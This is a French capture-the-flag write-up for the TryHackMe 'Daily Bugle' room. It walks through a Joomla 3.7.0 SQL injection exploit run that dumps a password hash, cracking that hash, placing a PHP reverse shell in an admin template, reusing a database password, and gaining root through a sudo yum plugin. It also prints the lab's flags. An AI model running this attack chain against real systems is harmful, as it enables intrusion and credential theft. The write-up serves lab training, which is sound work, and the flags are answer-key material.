# Daily Bugle

## Access the web server, who robbed the bank?

### Nmap Scan

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```
Lorsque nous nous connectons sur la page principale nous pouvons voir la personne qui dérobe la bank qui est `spiderman`
![image](https://media.discordapp.net/attachments/1009169820413071504/1036668160448925777/unknown.png?width=876&height=662)

## What is the Joomla version?

Grâce au README.txt, nous pouvons trouver la version de Joomla
```
$ curl -s http://10.15.236.69/README.txt | head
1- What is this?
    * This is a Joomla! installation/upgrade package to version 3.x
    * Joomla! Official site: https://www.joomla.org
    * Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
    * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

2- What is Joomla?
    * Joomla! is a Content Management System (CMS) which enables you to build Web sites and powerful online applications.
    * It's a free and Open Source software, distributed under the GNU General Public License version 2 or later.
    * This is a simple and powerful web server application and it requires a server with PHP and either MySQL, PostgreSQL or SQL Server to run.
```
Donc on peut voir que Joomla est à la version `3.7.0`

## What is Jonah's cracked password?

J'ai trouvé une exploit qui existait pour Joomla, je l'ai donc essayer et voici le résultat:
```
$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
$ python joomblah.py http://10.15.236.69

[REDACTED]

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Maintenant, nous avons le mot de passe hashé de Jonah, nous allons donc le crack à l'aide de John: 

```
$ /data/src/john/run/john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:09:27 DONE (2022-10-31 15:30) 0.001762g/s 82.55p/s 82.55c/s 82.55C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Voici donc le mot de passe de Jonah qui était `spiderman123`

## What is the user flag?

Installons un reverse shell en php sur revshell

Nous allons aller dans la dir `administrator` puis tapez le username Jonah et le password spiderman123 pour se connecter à la page d'administration

Une fois connecter, dirigeons nous vers Extensions puis cliquer sur Templates

Ensuite, cliquez sur Beez3 Details and Files et normalement si tout a bien été fait vous arriverez sur cette page:

![image](https://media.discordapp.net/attachments/1009169820413071504/1036671406605340742/unknown.png?width=1215&height=662)

`http://10.15.236.69/templates/beez3/index.php`

Ensuite, j'ai inspecté le répertoire /var/www/html/ et extrait les informations suivantes du fichier configuration.php, qui révèle le mot de passe de la base de données.

```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
    public $offline = '0';
    public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
    public $display_offline_message = '1';
    public $offline_image = '';
    public $sitename = 'The Daily Bugle';
    public $editor = 'tinymce';
    public $captcha = '0';
    public $list_limit = '20';
    public $access = '1';
    public $debug = '0';
    public $debug_lang = '0';
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'root';
    public $password = 'nv5uz9r3ZEDzVjNu';
[REDACTED]
```
Puis après réflection je viens de remarquer que ce mot de passe et celui de jjameson.

```
sh-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu

$ whoami
jjameson
$ cd
$ ls
user.txt
$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```

**User flag**: `27a260fe3cba712cfdedb1c86d80442e`

## What is the root flag?

Enfin du coup, je me suis donc connecter en ssh sur l'utilisateur jjameson et voici le résultat:

```
$ ssh jjameson@10.10.233.69
jjameson@10.10.233.69's password: 
Last login: Sun Jun 14 12:07:53 2020
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Récupérons le dernier flag:
```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```

**Flag Root:** `eec3d53292b1821868266858d7fa6f79`





